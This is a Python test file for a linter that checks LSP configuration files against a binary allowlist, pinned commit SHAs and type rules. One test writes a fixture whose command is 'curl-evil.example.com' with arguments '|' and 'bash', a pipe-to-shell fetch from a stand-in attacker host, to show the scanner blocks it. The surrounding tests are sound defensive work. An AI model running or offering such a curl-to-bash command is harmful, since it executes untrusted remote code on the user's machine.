"""Tests for the LSP config linter (heretek-owned, no third-party binary)."""
from __future__ import annotations

import json
from pathlib import Path

from scripts.scanners.lsp import scan_lsp

REPO_ROOT = Path(__file__).resolve().parent.parent


def test_scan_lsp_clean_when_url_matches_pinned_sha() -> None:
    path = REPO_ROOT / "tests/fixtures/security_scan/good_lsp_config"
    report = scan_lsp(path, item_id="rust-analyzer")
    assert report.severity == "clean"
    assert report.scanner == "config-lint"


def test_scan_lsp_block_when_url_drifts_from_pinned_sha() -> None:
    path = REPO_ROOT / "tests/fixtures/security_scan/bad_lsp_config_url_drift"
    report = scan_lsp(path, item_id="rust-analyzer", pinned_sha="8e505372b769fcd787b44fd5391e60fa3ada7f22")
    assert report.severity == "block"
    assert any("rootUri" in f.path for f in report.findings)


def test_scan_lsp_warn_when_config_missing() -> None:
    path = REPO_ROOT / "tests/fixtures/security_scan/does-not-exist"
    report = scan_lsp(path, item_id="rust-analyzer")
    assert report.severity in ("warn", "block")
    assert any("missing" in f.message.lower() for f in report.findings)


def test_scan_lsp_block_when_command_is_unknown_binary() -> None:
    """If the LSP config points at a binary name not on the allowlist, block."""
    bad = REPO_ROOT / "tests/fixtures/security_scan/good_lsp_config"
    bad.mkdir(parents=True, exist_ok=True)
    cfg = bad / ".lsp.json"
    original = cfg.read_text() if cfg.exists() else None
    cfg.write_text(json.dumps({
        "command": "curl-evil.example.com",
        "args": ["|", "bash"],
        "rootUri": "https://github.com/foo/bar/commit/abc",
    }))
    try:
        report = scan_lsp(bad, item_id="suspicious-lsp")
        assert report.severity == "block"
        assert any("command" in f.path for f in report.findings)
    finally:
        if original is None:
            cfg.unlink()
        else:
            cfg.write_text(original)


def _write_lsp_config(parent: Path, payload: object) -> Path:
    """Helper: write `payload` as the .lsp.json for a fresh dir under `parent`."""
    d = parent / "lsp_item"
    d.mkdir(parents=True, exist_ok=True)
    (d / ".lsp.json").write_text(json.dumps(payload))
    return d


def test_scan_lsp_block_when_top_level_is_array(tmp_path: Path) -> None:
    """D11: top-level must be a JSON object; arrays/strings must block."""
    d = _write_lsp_config(tmp_path, [])
    report = scan_lsp(d, item_id="array-cfg")
    assert report.severity == "block"
    assert any(f.rule_id == "lsp-config-invalid" for f in report.findings)


def test_scan_lsp_block_when_command_is_list(tmp_path: Path) -> None:
    """D11: 'command' must be a string. Lists are unhashable vs the allowlist."""
    d = _write_lsp_config(tmp_path, {"command": ["npx", "tsc"]})
    report = scan_lsp(d, item_id="list-cmd")
    assert report.severity == "block"
    assert any(f.rule_id == "lsp-config-invalid" for f in report.findings)
    assert any("command" in f.path for f in report.findings)


def test_scan_lsp_block_when_rootUri_is_not_a_string(tmp_path: Path) -> None:
    """D11: 'rootUri' must be a string when present; numeric/boolean must block."""
    d = _write_lsp_config(tmp_path, {"command": "rust-analyzer", "rootUri": 42})
    report = scan_lsp(d, item_id="num-rooturi")
    assert report.severity == "block"
    assert any(f.rule_id == "lsp-config-invalid" for f in report.findings)
    assert any("rootUri" in f.path for f in report.findings)


def test_scan_lsp_clean_when_rootUri_is_non_github_url(tmp_path: Path) -> None:
    """A non-GitHub URL is permitted (caller's choice) — no regex match, no drift."""
    d = _write_lsp_config(
        tmp_path,
        {
            "command": "rust-analyzer",
            "rootUri": "https://example.com/not-github/123",
        },
    )
    report = scan_lsp(d, item_id="nongithub-rooturi", pinned_sha="anything")
    assert report.severity == "clean"
    assert report.findings == []
